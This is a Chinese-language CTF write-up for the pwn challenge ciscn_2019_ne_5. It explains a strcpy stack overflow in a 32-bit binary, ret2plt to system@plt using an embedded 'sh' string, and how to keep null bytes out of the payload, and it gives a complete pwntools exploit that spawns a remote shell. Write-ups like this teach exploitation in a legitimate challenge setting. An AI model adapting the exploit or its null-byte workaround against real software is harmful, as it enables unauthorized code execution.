---
title: ciscn_2019_ne_5 strcpy 栈溢出与 \x00 截断绕过
date: 2026-05-12 16:55:00
categories:
  - pwn
tags:
  - 栈溢出
  - ret2plt
  - strcpy
  - \x00截断
  - 32位
---

> CISCN 2019 初赛 | strcpy 栈溢出利用，巧避空字节截断劫持控制流

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 题目名称 | [CISCN 2019 初赛] NE 5 |
| 架构 | 32位 Linux ELF (i386) |
| 保护机制 | NX 开启，无 PIE，无 Canary |
| 核心漏洞 | strcpy 栈缓冲区溢出 |
| 利用技巧 | ret2plt + \x00 截断绕过 |

## 0x02 逆向分析

### 阶段一：硬编码密码校验

程序首先要求输入管理员密码，使用 `scanf("%100s", s1)` 读取，并与硬编码字符串对比：

```c
scanf("%100s", s1);
if (strcmp(s1, "administrator") != 0) {
    puts("Password error!");
    exit(0);
}
```

直接输入 `administrator` 即可通过校验。

### 阶段二：菜单操作与隐藏分支

通过校验后，程序展示一个 `1~4` 的菜单。其中选项 4 是一个隐藏分支，调用 `GetFlag(src)` 函数：

```c
case 1:
    AddLog(src);    // 向 src 写入最多 128 字节
    break;
case 4:
    GetFlag(src);   // 假后门，实际触发溢出
    break;
```

**陷阱**：选项 4 看起来是"获取 Flag"的后门，但 `GetFlag` 只是打印 `The flag is your log:` 并拼接用户输入的日志内容，本身不输出真正的 Flag。

### 阶段三：真正的漏洞 —— strcpy 栈溢出

`GetFlag` 函数内部存在关键漏洞：

```c
void GetFlag(char *src) {
    char dest[0x48];           // 局部缓冲区，距 ebp 偏移 72 字节
    strcpy(dest, src);         // 无边界检查！
    printf("The flag is your log: %s\n", dest);
}
```

`dest` 仅有 72 字节空间，但 `src` 来自用户通过 `AddLog` 写入的最长 128 字节。`strcpy` 不检查长度，直接复制，导致栈缓冲区溢出，可以覆盖 `ebp` 和 `eip`（返回地址）。

## 0x03 漏洞利用思路

### 基本攻击链

1. 输入密码 `administrator` 通过校验
2. 选择菜单 1（AddLog），写入精心构造的 ROP Payload
3. 选择菜单 4（GetFlag），触发 `strcpy` 栈溢出，劫持控制流

### ret2plt 策略

由于 NX 开启，栈不可执行，不能直接执行 shellcode。采用 ret2plt 手法：

- `system@plt`：程序已链接 system 函数，可直接调用
- `sh` 字符串：程序中自带 `sh\x00` 字符串（通常在 `.rodata` 段），可通过 `elf.search(b'sh\x00')` 定位

### Payload 布局

```
| 垃圾数据 (0x48 = 72字节) | 覆盖 ebp (4字节) | system@plt (4字节) | 返回地址 (4字节) | sh_addr (4字节) |
|------|------|------|------|------|
| 填满 dest 缓冲区 | 随意填充 | 劫持 eip | system 返回后地址 | system 的参数 |
```

## 0x04 踩坑：\x00 截断问题

### 失败的尝试

初次构造 Payload 时，返回地址使用 `p32(0)`：

```python
payload = b'a' * 0x48 + b'b' * 4 + p32(system_plt) + p32(0) + p32(sh_addr)
```

程序直接崩溃，无法获取 Shell。

### 根因分析

`p32(0)` 在内存中表示为 `\x00\x00\x00\x00`。C 语言的 `strcpy` 以 `\x00`（空字符）作为字符串终止符。当 `strcpy` 复制到 `\x00` 时立即停止，导致后续的 `p32(sh_addr)` 完全没有被复制到栈上。

**内存对比**：

```
期望的栈布局:
[72字节垃圾][4字节ebp][system_plt][返回地址][sh_addr]
                                          ↑ strcpy 在这里遇到 \x00 停止

实际复制到栈上的:
[72字节垃圾][4字节 ebp][system_plt][\x00\x00\x00\x00]
                                      ↑ 到此为止
```

结果：`system` 执行时从栈上取到的是残留的垃圾数据作为参数，命令执行失败。

### 解决方案

将 `p32(0)` 替换为不包含 `\x00` 的任意可见字符：

```python
payload = b'a' * 0x48 + b'b' * 4 + p32(system_plt) + b'cccc' + p32(sh_addr)
```

`b'cccc'`（`\x63\x63\x63\x63`）不含 `\x00`，`strcpy` 能完整复制整条 ROP 链。`cccc` 仅作为 `system` 执行完的返回地址，实际值无关紧要。

## 0x05 Exploit 代码

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

io = remote('node5.buuoj.cn', 26858)
elf = ELF('./ciscn_2019_ne_5')

# 获取关键地址
system_plt = elf.plt['system']
sh_addr = next(elf.search(b'sh\x00'))

# Step 1: 输入管理员密码
io.recvuntil(b"Please input admin password:")
io.sendline(b"administrator")

# Step 2: 选择 AddLog，写入 ROP Payload
io.recvuntil(b"0.Exit\n:")
io.sendline(b"1")
io.recvuntil(b"Please input new log info:")

# 构造 Payload: 填充 + ebp + system@plt + 返回地址(无\x00) + sh地址
payload = b'a' * 0x48 + b'b' * 4 + p32(system_plt) + b'cccc' + p32(sh_addr)
io.sendline(payload)

# Step 3: 选择 GetFlag，触发 strcpy 栈溢出
io.recvuntil(b"0.Exit\n:")
io.sendline(b"4")

# Step 4: 获取 Shell
io.interactive()
```

## 0x06 执行结果

```
Payload 布局 (十六进制):
61*48  62*4  [system_plt]  63636363  [sh_addr]
↑ 填充  ↑ebp ↑ ret→system  ↑ 返回地址 ↑ "sh\x00"

[*] Switching to interactive mode
$ cat flag
flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

## 0x07 核心考点

- **strcpy 栈溢出**：`strcpy` 以 `\x00` 为终止符，不检查长度，可溢出覆盖返回地址
- **\x00 截断绕过**：ROP 链中不能出现 `\x00`，否则 `strcpy` 提前终止，用可见字符替代 `p32(0)`
- **ret2plt**：NX 开启时利用程序自带的 `system@plt` 和 `sh` 字符串构造 ROP 链
- **假后门识别**：`GetFlag` 并非真正后门，而是触发漏洞的入口
- **信息泄露 vs 利用**：程序提供了 `system` 和 `sh` 的地址，无需额外泄露
